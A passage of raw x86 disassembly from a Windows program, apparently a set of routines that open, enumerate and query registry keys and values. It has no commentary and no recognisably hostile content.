  409019:	ff 75 0c             	push   0xc(%ebp)
  40901c:	8b f0                	mov    %eax,%esi
  40901e:	ff 15 30 00 41 00    	call   *0x410030
  409024:	3b f3                	cmp    %ebx,%esi
  409026:	75 02                	jne    0x40902a
  409028:	b3 01                	mov    $0x1,%bl
  40902a:	8d 4d 14             	lea    0x14(%ebp),%ecx
  40902d:	ff 15 54 02 41 00    	call   *0x410254
  409033:	8a c3                	mov    %bl,%al
  409035:	5e                   	pop    %esi
  409036:	5b                   	pop    %ebx
  409037:	5d                   	pop    %ebp
  409038:	c3                   	ret
  409039:	8d 4d 14             	lea    0x14(%ebp),%ecx
  40903c:	ff 15 54 02 41 00    	call   *0x410254
  409042:	32 c0                	xor    %al,%al
  409044:	5d                   	pop    %ebp
  409045:	c3                   	ret
  409046:	55                   	push   %ebp
  409047:	8b ec                	mov    %esp,%ebp
  409049:	8d 45 0c             	lea    0xc(%ebp),%eax
  40904c:	50                   	push   %eax
  40904d:	ff 75 0c             	push   0xc(%ebp)
  409050:	ff 75 08             	push   0x8(%ebp)
  409053:	ff 15 20 00 41 00    	call   *0x410020
  409059:	85 c0                	test   %eax,%eax
  40905b:	75 2a                	jne    0x409087
  40905d:	56                   	push   %esi
  40905e:	8d 45 14             	lea    0x14(%ebp),%eax
  409061:	6a 04                	push   $0x4
  409063:	50                   	push   %eax
  409064:	6a 04                	push   $0x4
  409066:	6a 00                	push   $0x0
  409068:	ff 75 10             	push   0x10(%ebp)
  40906b:	ff 75 0c             	push   0xc(%ebp)
  40906e:	ff 15 24 00 41 00    	call   *0x410024
  409074:	ff 75 0c             	push   0xc(%ebp)
  409077:	8b f0                	mov    %eax,%esi
  409079:	ff 15 30 00 41 00    	call   *0x410030
  40907f:	85 f6                	test   %esi,%esi
  409081:	0f 94 c0             	sete   %al
  409084:	5e                   	pop    %esi
  409085:	5d                   	pop    %ebp
  409086:	c3                   	ret
  409087:	32 c0                	xor    %al,%al
  409089:	5d                   	pop    %ebp
  40908a:	c3                   	ret
  40908b:	55                   	push   %ebp
  40908c:	8b ec                	mov    %esp,%ebp
  40908e:	8d 45 0c             	lea    0xc(%ebp),%eax
  409091:	50                   	push   %eax
  409092:	ff 75 0c             	push   0xc(%ebp)
  409095:	ff 75 08             	push   0x8(%ebp)
  409098:	ff 15 20 00 41 00    	call   *0x410020
  40909e:	85 c0                	test   %eax,%eax
  4090a0:	75 2a                	jne    0x4090cc
  4090a2:	56                   	push   %esi
  4090a3:	8d 45 14             	lea    0x14(%ebp),%eax
  4090a6:	6a 08                	push   $0x8
  4090a8:	50                   	push   %eax
  4090a9:	6a 0b                	push   $0xb
  4090ab:	6a 00                	push   $0x0
  4090ad:	ff 75 10             	push   0x10(%ebp)
  4090b0:	ff 75 0c             	push   0xc(%ebp)
  4090b3:	ff 15 24 00 41 00    	call   *0x410024
  4090b9:	ff 75 0c             	push   0xc(%ebp)
  4090bc:	8b f0                	mov    %eax,%esi
  4090be:	ff 15 30 00 41 00    	call   *0x410030
  4090c4:	85 f6                	test   %esi,%esi
  4090c6:	0f 94 c0             	sete   %al
  4090c9:	5e                   	pop    %esi
  4090ca:	5d                   	pop    %ebp
  4090cb:	c3                   	ret
  4090cc:	32 c0                	xor    %al,%al
  4090ce:	5d                   	pop    %ebp
  4090cf:	c3                   	ret
  4090d0:	55                   	push   %ebp
  4090d1:	8b ec                	mov    %esp,%ebp
  4090d3:	81 ec 1c 04 00 00    	sub    $0x41c,%esp
  4090d9:	53                   	push   %ebx
  4090da:	8d 8d e4 fb ff ff    	lea    -0x41c(%ebp),%ecx
  4090e0:	ff 75 20             	push   0x20(%ebp)
  4090e3:	ff 75 1c             	push   0x1c(%ebp)
  4090e6:	e8 00 98 ff ff       	call   0x4028eb
  4090eb:	ff 75 18             	push   0x18(%ebp)
  4090ee:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4090f1:	8d 8d e4 fb ff ff    	lea    -0x41c(%ebp),%ecx
  4090f7:	ff 75 14             	push   0x14(%ebp)
  4090fa:	50                   	push   %eax
  4090fb:	e8 2a 99 ff ff       	call   0x402a2a
  409100:	6a 01                	push   $0x1
  409102:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409105:	83 ec 10             	sub    $0x10,%esp
  409108:	8b cc                	mov    %esp,%ecx
  40910a:	50                   	push   %eax
  40910b:	ff 15 60 02 41 00    	call   *0x410260
  409111:	ff 75 10             	push   0x10(%ebp)
  409114:	ff 75 0c             	push   0xc(%ebp)
  409117:	ff 75 08             	push   0x8(%ebp)
  40911a:	e8 bb fe ff ff       	call   0x408fda
  40911f:	83 c4 20             	add    $0x20,%esp
  409122:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409125:	8a d8                	mov    %al,%bl
  409127:	ff 15 54 02 41 00    	call   *0x410254
  40912d:	8a c3                	mov    %bl,%al
  40912f:	5b                   	pop    %ebx
  409130:	c9                   	leave
  409131:	c3                   	ret
  409132:	55                   	push   %ebp
  409133:	8b ec                	mov    %esp,%ebp
  409135:	8d 45 0c             	lea    0xc(%ebp),%eax
  409138:	50                   	push   %eax
  409139:	6a 02                	push   $0x2
  40913b:	6a 00                	push   $0x0
  40913d:	ff 75 0c             	push   0xc(%ebp)
  409140:	ff 75 08             	push   0x8(%ebp)
  409143:	ff 15 28 00 41 00    	call   *0x410028
  409149:	85 c0                	test   %eax,%eax
  40914b:	74 04                	je     0x409151
  40914d:	32 c0                	xor    %al,%al
  40914f:	5d                   	pop    %ebp
  409150:	c3                   	ret
  409151:	ff 75 10             	push   0x10(%ebp)
  409154:	ff 75 0c             	push   0xc(%ebp)
  409157:	ff 15 1c 00 41 00    	call   *0x41001c
  40915d:	f7 d8                	neg    %eax
  40915f:	1a c0                	sbb    %al,%al
  409161:	fe c0                	inc    %al
  409163:	5d                   	pop    %ebp
  409164:	c3                   	ret
  409165:	e8 05 00 00 00       	call   0x40916f
  40916a:	e9 15 00 00 00       	jmp    0x409184
  40916f:	55                   	push   %ebp
  409170:	8b ec                	mov    %esp,%ebp
  409172:	51                   	push   %ecx
  409173:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409176:	b9 98 59 41 00       	mov    $0x415998,%ecx
  40917b:	50                   	push   %eax
  40917c:	ff 15 50 02 41 00    	call   *0x410250
  409182:	c9                   	leave
  409183:	c3                   	ret
  409184:	68 90 91 40 00       	push   $0x409190
  409189:	e8 2c 6b 00 00       	call   0x40fcba
  40918e:	59                   	pop    %ecx
  40918f:	c3                   	ret
  409190:	b9 98 59 41 00       	mov    $0x415998,%ecx
  409195:	ff 25 54 02 41 00    	jmp    *0x410254
  40919b:	e8 05 00 00 00       	call   0x4091a5
  4091a0:	e9 15 00 00 00       	jmp    0x4091ba
  4091a5:	55                   	push   %ebp
  4091a6:	8b ec                	mov    %esp,%ebp
  4091a8:	51                   	push   %ecx
  4091a9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4091ac:	b9 00 5a 41 00       	mov    $0x415a00,%ecx
  4091b1:	50                   	push   %eax
  4091b2:	ff 15 50 02 41 00    	call   *0x410250
  4091b8:	c9                   	leave
  4091b9:	c3                   	ret
  4091ba:	68 c6 91 40 00       	push   $0x4091c6
  4091bf:	e8 f6 6a 00 00       	call   0x40fcba
  4091c4:	59                   	pop    %ecx
  4091c5:	c3                   	ret
  4091c6:	b9 00 5a 41 00       	mov    $0x415a00,%ecx
  4091cb:	ff 25 54 02 41 00    	jmp    *0x410254
  4091d1:	e8 05 00 00 00       	call   0x4091db
  4091d6:	e9 15 00 00 00       	jmp    0x4091f0
  4091db:	55                   	push   %ebp
  4091dc:	8b ec                	mov    %esp,%ebp
  4091de:	51                   	push   %ecx
  4091df:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4091e2:	b9 e8 59 41 00       	mov    $0x4159e8,%ecx
  4091e7:	50                   	push   %eax
  4091e8:	ff 15 50 02 41 00    	call   *0x410250
  4091ee:	c9                   	leave
  4091ef:	c3                   	ret
  4091f0:	68 fc 91 40 00       	push   $0x4091fc
  4091f5:	e8 c0 6a 00 00       	call   0x40fcba
  4091fa:	59                   	pop    %ecx
  4091fb:	c3                   	ret
  4091fc:	b9 e8 59 41 00       	mov    $0x4159e8,%ecx
  409201:	ff 25 54 02 41 00    	jmp    *0x410254
  409207:	e8 05 00 00 00       	call   0x409211
  40920c:	e9 15 00 00 00       	jmp    0x409226
  409211:	55                   	push   %ebp
  409212:	8b ec                	mov    %esp,%ebp
  409214:	51                   	push   %ecx
  409215:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409218:	b9 10 5a 41 00       	mov    $0x415a10,%ecx
  40921d:	50                   	push   %eax
  40921e:	ff 15 50 02 41 00    	call   *0x410250
  409224:	c9                   	leave
  409225:	c3                   	ret
  409226:	68 32 92 40 00       	push   $0x409232
  40922b:	e8 8a 6a 00 00       	call   0x40fcba
  409230:	59                   	pop    %ecx
  409231:	c3                   	ret
  409232:	b9 10 5a 41 00       	mov    $0x415a10,%ecx
  409237:	ff 25 54 02 41 00    	jmp    *0x410254
  40923d:	e8 05 00 00 00       	call   0x409247
  409242:	e9 0d 00 00 00       	jmp    0x409254
  409247:	6a 00                	push   $0x0
  409249:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  40924e:	e8 8e 8e ff ff       	call   0x4020e1
  409253:	c3                   	ret
  409254:	68 60 92 40 00       	push   $0x409260
  409259:	e8 5c 6a 00 00       	call   0x40fcba
  40925e:	59                   	pop    %ecx
  40925f:	c3                   	ret
  409260:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409265:	e9 6c 8f ff ff       	jmp    0x4021d6
  40926a:	55                   	push   %ebp
  40926b:	8b ec                	mov    %esp,%ebp
  40926d:	b8 d8 69 00 00       	mov    $0x69d8,%eax
  409272:	e8 79 6a 00 00       	call   0x40fcf0
  409277:	a0 68 06 41 00       	mov    0x410668,%al
  40927c:	53                   	push   %ebx
  40927d:	57                   	push   %edi
  40927e:	6a 40                	push   $0x40
  409280:	88 85 38 fe ff ff    	mov    %al,-0x1c8(%ebp)
  409286:	59                   	pop    %ecx
  409287:	33 c0                	xor    %eax,%eax
  409289:	8d bd 39 fe ff ff    	lea    -0x1c7(%ebp),%edi
  40928f:	f3 ab                	rep stos %eax,%es:(%edi)
  409291:	66 ab                	stos   %ax,%es:(%edi)
  409293:	aa                   	stos   %al,%es:(%edi)
  409294:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409297:	33 db                	xor    %ebx,%ebx
  409299:	50                   	push   %eax
  40929a:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40929d:	50                   	push   %eax
  40929e:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4092a1:	50                   	push   %eax
  4092a2:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4092a5:	50                   	push   %eax
  4092a6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4092a9:	50                   	push   %eax
  4092aa:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4092ad:	50                   	push   %eax
  4092ae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4092b1:	50                   	push   %eax
  4092b2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4092b5:	50                   	push   %eax
  4092b6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4092b9:	53                   	push   %ebx
  4092ba:	50                   	push   %eax
  4092bb:	8d 85 38 fe ff ff    	lea    -0x1c8(%ebp),%eax
  4092c1:	c7 45 d8 04 01 00 00 	movl   $0x104,-0x28(%ebp)
  4092c8:	50                   	push   %eax
  4092c9:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4092cc:	ff 75 08             	push   0x8(%ebp)
  4092cf:	c7 45 e4 ff 3f 00 00 	movl   $0x3fff,-0x1c(%ebp)
  4092d6:	ff 15 10 00 41 00    	call   *0x410010
  4092dc:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4092df:	74 78                	je     0x409359
  4092e1:	33 ff                	xor    %edi,%edi
  4092e3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4092e6:	76 71                	jbe    0x409359
  4092e8:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4092eb:	c7 45 e0 ff 00 00 00 	movl   $0xff,-0x20(%ebp)
  4092f2:	50                   	push   %eax
  4092f3:	53                   	push   %ebx
  4092f4:	53                   	push   %ebx
  4092f5:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4092f8:	53                   	push   %ebx
  4092f9:	50                   	push   %eax
  4092fa:	8d 85 38 fd ff ff    	lea    -0x2c8(%ebp),%eax
  409300:	50                   	push   %eax
  409301:	57                   	push   %edi
  409302:	ff 75 08             	push   0x8(%ebp)
  409305:	ff 15 14 00 41 00    	call   *0x410014
  40930b:	85 c0                	test   %eax,%eax
  40930d:	75 44                	jne    0x409353
  40930f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  409312:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  409315:	50                   	push   %eax
  409316:	68 c8 0e 41 00       	push   $0x410ec8
  40931b:	ff 15 4c 02 41 00    	call   *0x41024c
  409321:	50                   	push   %eax
  409322:	8d 85 38 fd ff ff    	lea    -0x2c8(%ebp),%eax
  409328:	50                   	push   %eax
  409329:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40932c:	50                   	push   %eax
  40932d:	e8 e8 68 00 00       	call   0x40fc1a
  409332:	83 c4 0c             	add    $0xc,%esp
  409335:	b9 00 5a 41 00       	mov    $0x415a00,%ecx
  40933a:	50                   	push   %eax
  40933b:	ff 15 94 02 41 00    	call   *0x410294
  409341:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  409344:	ff 15 54 02 41 00    	call   *0x410254
  40934a:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40934d:	ff 15 54 02 41 00    	call   *0x410254
  409353:	47                   	inc    %edi
  409354:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  409357:	72 8f                	jb     0x4092e8
  409359:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  40935c:	0f 84 78 01 00 00    	je     0x4094da
  409362:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  409365:	0f 86 6f 01 00 00    	jbe    0x4094da
  40936b:	33 c0                	xor    %eax,%eax
  40936d:	8d 7d cd             	lea    -0x33(%ebp),%edi
  409370:	88 5d cc             	mov    %bl,-0x34(%ebp)
  409373:	c7 45 e8 10 27 00 00 	movl   $0x2710,-0x18(%ebp)
  40937a:	ab                   	stos   %eax,%es:(%edi)
  40937b:	ab                   	stos   %eax,%es:(%edi)
  40937c:	66 ab                	stos   %ax,%es:(%edi)
  40937e:	aa                   	stos   %al,%es:(%edi)
  40937f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  409382:	c7 45 e4 ff 3f 00 00 	movl   $0x3fff,-0x1c(%ebp)
  409389:	50                   	push   %eax
  40938a:	8d 85 28 d6 ff ff    	lea    -0x29d8(%ebp),%eax
  409390:	50                   	push   %eax
  409391:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409394:	50                   	push   %eax
  409395:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  409398:	53                   	push   %ebx
  409399:	50                   	push   %eax
  40939a:	8d 85 28 96 ff ff    	lea    -0x69d8(%ebp),%eax
  4093a0:	88 9d 28 96 ff ff    	mov    %bl,-0x69d8(%ebp)
  4093a6:	50                   	push   %eax
  4093a7:	ff 75 f4             	push   -0xc(%ebp)
  4093aa:	ff 75 08             	push   0x8(%ebp)
  4093ad:	ff 15 18 00 41 00    	call   *0x410018
  4093b3:	85 c0                	test   %eax,%eax
  4093b5:	0f 85 10 01 00 00    	jne    0x4094cb
  4093bb:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4093be:	6a 0a                	push   $0xa
  4093c0:	50                   	push   %eax
  4093c1:	ff 75 dc             	push   -0x24(%ebp)
  4093c4:	ff 15 5c 03 41 00    	call   *0x41035c
  4093ca:	83 c4 0c             	add    $0xc,%esp
  4093cd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4093d0:	bf c8 0e 41 00       	mov    $0x410ec8,%edi
  4093d5:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  4093db:	50                   	push   %eax
  4093dc:	57                   	push   %edi
  4093dd:	ff 15 4c 02 41 00    	call   *0x41024c
  4093e3:	50                   	push   %eax
  4093e4:	8d 85 28 96 ff ff    	lea    -0x69d8(%ebp),%eax
  4093ea:	50                   	push   %eax
  4093eb:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4093ee:	50                   	push   %eax
  4093ef:	e8 26 68 00 00       	call   0x40fc1a
  4093f4:	83 c4 0c             	add    $0xc,%esp
  4093f7:	b9 98 59 41 00       	mov    $0x415998,%ecx
  4093fc:	50                   	push   %eax
  4093fd:	ff 15 94 02 41 00    	call   *0x410294
  409403:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  409406:	ff 15 54 02 41 00    	call   *0x410254
  40940c:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  409412:	ff 15 54 02 41 00    	call   *0x410254
  409418:	8d 45 ed             	lea    -0x13(%ebp),%eax
  40941b:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  409421:	50                   	push   %eax
  409422:	57                   	push   %edi
  409423:	ff 15 4c 02 41 00    	call   *0x41024c
  409429:	50                   	push   %eax
  40942a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40942d:	50                   	push   %eax
  40942e:	8d 45 8c             	lea    -0x74(%ebp),%eax
  409431:	50                   	push   %eax
  409432:	e8 e3 67 00 00       	call   0x40fc1a
  409437:	83 c4 0c             	add    $0xc,%esp
  40943a:	b9 e8 59 41 00       	mov    $0x4159e8,%ecx
  40943f:	50                   	push   %eax
  409440:	ff 15 94 02 41 00    	call   *0x410294
  409446:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  409449:	ff 15 54 02 41 00    	call   *0x410254
  40944f:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  409455:	ff 15 54 02 41 00    	call   *0x410254
  40945b:	8d 45 ef             	lea    -0x11(%ebp),%eax
  40945e:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  409464:	50                   	push   %eax
  409465:	68 1c 12 41 00       	push   $0x41121c
  40946a:	ff 15 4c 02 41 00    	call   *0x41024c
  409470:	50                   	push   %eax
  409471:	8d 45 ee             	lea    -0x12(%ebp),%eax
  409474:	50                   	push   %eax
  409475:	8d 85 28 d6 ff ff    	lea    -0x29d8(%ebp),%eax
  40947b:	ff 75 e8             	push   -0x18(%ebp)
  40947e:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  409484:	50                   	push   %eax
  409485:	ff 15 70 02 41 00    	call   *0x410270
  40948b:	50                   	push   %eax
  40948c:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  409492:	50                   	push   %eax
  409493:	e8 7c 67 00 00       	call   0x40fc14
  409498:	83 c4 0c             	add    $0xc,%esp
  40949b:	b9 10 5a 41 00       	mov    $0x415a10,%ecx
  4094a0:	50                   	push   %eax
  4094a1:	ff 15 94 02 41 00    	call   *0x410294
  4094a7:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  4094ad:	ff 15 54 02 41 00    	call   *0x410254
  4094b3:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  4094b9:	ff 15 54 02 41 00    	call   *0x410254
  4094bf:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4094c5:	ff 15 54 02 41 00    	call   *0x410254
  4094cb:	ff 45 f4             	incl   -0xc(%ebp)
  4094ce:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4094d1:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  4094d4:	0f 82 91 fe ff ff    	jb     0x40936b
  4094da:	5f                   	pop    %edi
  4094db:	5b                   	pop    %ebx
  4094dc:	c9                   	leave
  4094dd:	c3                   	ret
  4094de:	55                   	push   %ebp
  4094df:	8b ec                	mov    %esp,%ebp
  4094e1:	56                   	push   %esi
  4094e2:	8b 35 38 02 41 00    	mov    0x410238,%esi
  4094e8:	8d 45 08             	lea    0x8(%ebp),%eax
  4094eb:	68 44 12 41 00       	push   $0x411244
  4094f0:	50                   	push   %eax
  4094f1:	ff d6                	call   *%esi
  4094f3:	59                   	pop    %ecx
  4094f4:	84 c0                	test   %al,%al
  4094f6:	59                   	pop    %ecx
  4094f7:	74 07                	je     0x409500
  4094f9:	be 02 00 00 80       	mov    $0x80000002,%esi
  4094fe:	eb 5e                	jmp    0x40955e
  409500:	8d 45 08             	lea    0x8(%ebp),%eax
  409503:	68 3c 12 41 00       	push   $0x41123c
  409508:	50                   	push   %eax
  409509:	ff d6                	call   *%esi
  40950b:	59                   	pop    %ecx
  40950c:	84 c0                	test   %al,%al
  40950e:	59                   	pop    %ecx
  40950f:	74 07                	je     0x409518
  409511:	be 01 00 00 80       	mov    $0x80000001,%esi
  409516:	eb 46                	jmp    0x40955e
  409518:	8d 45 08             	lea    0x8(%ebp),%eax
  40951b:	68 34 12 41 00       	push   $0x411234
  409520:	50                   	push   %eax
  409521:	ff d6                	call   *%esi
  409523:	59                   	pop    %ecx
  409524:	84 c0                	test   %al,%al
  409526:	59                   	pop    %ecx
  409527:	74 07                	je     0x409530
  409529:	be 00 00 00 80       	mov    $0x80000000,%esi
  40952e:	eb 2e                	jmp    0x40955e
  409530:	8d 45 08             	lea    0x8(%ebp),%eax
  409533:	68 30 12 41 00       	push   $0x411230
  409538:	50                   	push   %eax
  409539:	ff d6                	call   *%esi
  40953b:	59                   	pop    %ecx
  40953c:	84 c0                	test   %al,%al
  40953e:	59                   	pop    %ecx
  40953f:	74 07                	je     0x409548
  409541:	be 03 00 00 80       	mov    $0x80000003,%esi
  409546:	eb 16                	jmp    0x40955e
  409548:	8d 45 08             	lea    0x8(%ebp),%eax
  40954b:	68 28 12 41 00       	push   $0x411228
  409550:	50                   	push   %eax
  409551:	ff d6                	call   *%esi
  409553:	59                   	pop    %ecx
  409554:	84 c0                	test   %al,%al
  409556:	59                   	pop    %ecx
  409557:	74 12                	je     0x40956b
  409559:	be 05 00 00 80       	mov    $0x80000005,%esi
  40955e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  409561:	ff 15 54 02 41 00    	call   *0x410254
  409567:	8b c6                	mov    %esi,%eax
  409569:	eb 09                	jmp    0x409574
  40956b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40956e:	ff 15 54 02 41 00    	call   *0x410254
  409574:	5e                   	pop    %esi
  409575:	5d                   	pop    %ebp
  409576:	c3                   	ret
  409577:	55                   	push   %ebp
  409578:	8b ec                	mov    %esp,%ebp
  40957a:	81 ec 94 00 00 00    	sub    $0x94,%esp
  409580:	53                   	push   %ebx
  409581:	56                   	push   %esi
  409582:	83 ec 10             	sub    $0x10,%esp
  409585:	8d 45 08             	lea    0x8(%ebp),%eax
  409588:	8b cc                	mov    %esp,%ecx
  40958a:	50                   	push   %eax
  40958b:	ff 15 60 02 41 00    	call   *0x410260
  409591:	e8 48 ff ff ff       	call   0x4094de
  409596:	83 c4 10             	add    $0x10,%esp
  409599:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40959c:	33 db                	xor    %ebx,%ebx
  40959e:	51                   	push   %ecx
  40959f:	68 19 00 02 00       	push   $0x20019
  4095a4:	53                   	push   %ebx
  4095a5:	ff 75 18             	push   0x18(%ebp)
  4095a8:	50                   	push   %eax
  4095a9:	ff 15 28 00 41 00    	call   *0x410028
  4095af:	85 c0                	test   %eax,%eax
  4095b1:	0f 85 68 01 00 00    	jne    0x40971f
  4095b7:	ff 75 fc             	push   -0x4(%ebp)
  4095ba:	e8 ab fc ff ff       	call   0x40926a
  4095bf:	38 5d 1c             	cmp    %bl,0x1c(%ebp)
  4095c2:	59                   	pop    %ecx
  4095c3:	b9 44 08 41 00       	mov    $0x410844,%ecx
  4095c8:	74 05                	je     0x4095cf
  4095ca:	b9 60 05 41 00       	mov    $0x410560,%ecx
  4095cf:	83 ec 10             	sub    $0x10,%esp
  4095d2:	b8 68 52 41 00       	mov    $0x415268,%eax
  4095d7:	8b f4                	mov    %esp,%esi
  4095d9:	68 10 5a 41 00       	push   $0x415a10
  4095de:	50                   	push   %eax
  4095df:	68 e8 59 41 00       	push   $0x4159e8
  4095e4:	50                   	push   %eax
  4095e5:	68 98 59 41 00       	push   $0x415998
  4095ea:	50                   	push   %eax
  4095eb:	68 00 5a 41 00       	push   $0x415a00
  4095f0:	50                   	push   %eax
  4095f1:	51                   	push   %ecx
  4095f2:	50                   	push   %eax
  4095f3:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4095f6:	68 54 12 41 00       	push   $0x411254
  4095fb:	50                   	push   %eax
  4095fc:	e8 19 66 00 00       	call   0x40fc1a
  409601:	83 c4 0c             	add    $0xc,%esp
  409604:	50                   	push   %eax
  409605:	8d 45 8c             	lea    -0x74(%ebp),%eax
  409608:	50                   	push   %eax
  409609:	e8 12 66 00 00       	call   0x40fc20
  40960e:	83 c4 0c             	add    $0xc,%esp
  409611:	50                   	push   %eax
  409612:	8d 45 ac             	lea    -0x54(%ebp),%eax
  409615:	50                   	push   %eax
  409616:	e8 f9 65 00 00       	call   0x40fc14
  40961b:	83 c4 0c             	add    $0xc,%esp
  40961e:	50                   	push   %eax
  40961f:	8d 45 cc             	lea    -0x34(%ebp),%eax
  409622:	50                   	push   %eax
  409623:	e8 ec 65 00 00       	call   0x40fc14
  409628:	83 c4 0c             	add    $0xc,%esp
  40962b:	50                   	push   %eax
  40962c:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40962f:	50                   	push   %eax
  409630:	e8 df 65 00 00       	call   0x40fc14
  409635:	83 c4 0c             	add    $0xc,%esp
  409638:	50                   	push   %eax
  409639:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40963c:	50                   	push   %eax
  40963d:	e8 d2 65 00 00       	call   0x40fc14
  409642:	83 c4 0c             	add    $0xc,%esp
  409645:	50                   	push   %eax
  409646:	8d 45 bc             	lea    -0x44(%ebp),%eax
  409649:	50                   	push   %eax
  40964a:	e8 c5 65 00 00       	call   0x40fc14
  40964f:	83 c4 0c             	add    $0xc,%esp
  409652:	50                   	push   %eax
  409653:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  409659:	50                   	push   %eax
  40965a:	e8 b5 65 00 00       	call   0x40fc14
  40965f:	83 c4 0c             	add    $0xc,%esp
  409662:	50                   	push   %eax
  409663:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  409669:	50                   	push   %eax
  40966a:	e8 a5 65 00 00       	call   0x40fc14
  40966f:	83 c4 0c             	add    $0xc,%esp
  409672:	50                   	push   %eax
  409673:	56                   	push   %esi
  409674:	e8 9b 65 00 00       	call   0x40fc14
  409679:	83 c4 0c             	add    $0xc,%esp
  40967c:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
  409681:	e8 12 8b ff ff       	call   0x402198
  409686:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40968c:	ff 15 54 02 41 00    	call   *0x410254
  409692:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  409698:	ff 15 54 02 41 00    	call   *0x410254
  40969e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4096a1:	ff 15 54 02 41 00    	call   *0x410254
  4096a7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4096aa:	ff 15 54 02 41 00    	call   *0x410254
  4096b0:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4096b3:	ff 15 54 02 41 00    	call   *0x410254
  4096b9:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4096bc:	ff 15 54 02 41 00    	call   *0x410254
  4096c2:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4096c5:	ff 15 54 02 41 00    	call   *0x410254
  4096cb:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4096ce:	ff 15 54 02 41 00    	call   *0x410254
  4096d4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4096d7:	ff 15 54 02 41 00    	call   *0x410254
  4096dd:	be 68 06 41 00       	mov    $0x410668,%esi
  4096e2:	b9 98 59 41 00       	mov    $0x415998,%ecx
  4096e7:	56                   	push   %esi
  4096e8:	ff 15 d8 02 41 00    	call   *0x4102d8
  4096ee:	56                   	push   %esi
  4096ef:	b9 00 5a 41 00       	mov    $0x415a00,%ecx
  4096f4:	ff 15 d8 02 41 00    	call   *0x4102d8
  4096fa:	56                   	push   %esi
  4096fb:	b9 e8 59 41 00       	mov    $0x4159e8,%ecx
  409700:	ff 15 d8 02 41 00    	call   *0x4102d8
  409706:	56                   	push   %esi
  409707:	b9 10 5a 41 00       	mov    $0x415a10,%ecx
  40970c:	ff 15 d8 02 41 00    	call   *0x4102d8
  409712:	ff 75 fc             	push   -0x4(%ebp)
  409715:	ff 15 30 00 41 00    	call   *0x410030
  40971b:	b3 01                	mov    $0x1,%bl
  40971d:	eb 3d                	jmp    0x40975c
  40971f:	83 ec 10             	sub    $0x10,%esp
  409722:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409725:	8b f4                	mov    %esp,%esi
  409727:	68 48 08 41 00       	push   $0x410848
  40972c:	68 68 52 41 00       	push   $0x415268
  409731:	68 4c 12 41 00       	push   $0x41124c
  409736:	50                   	push   %eax
  409737:	e8 de 64 00 00       	call   0x40fc1a
  40973c:	83 c4 0c             	add    $0xc,%esp
  40973f:	50                   	push   %eax
  409740:	56                   	push   %esi
  409741:	e8 da 64 00 00       	call   0x40fc20
  409746:	83 c4 0c             	add    $0xc,%esp
  409749:	b9 a8 59 41 00       	mov    $0x4159a8,%ecx
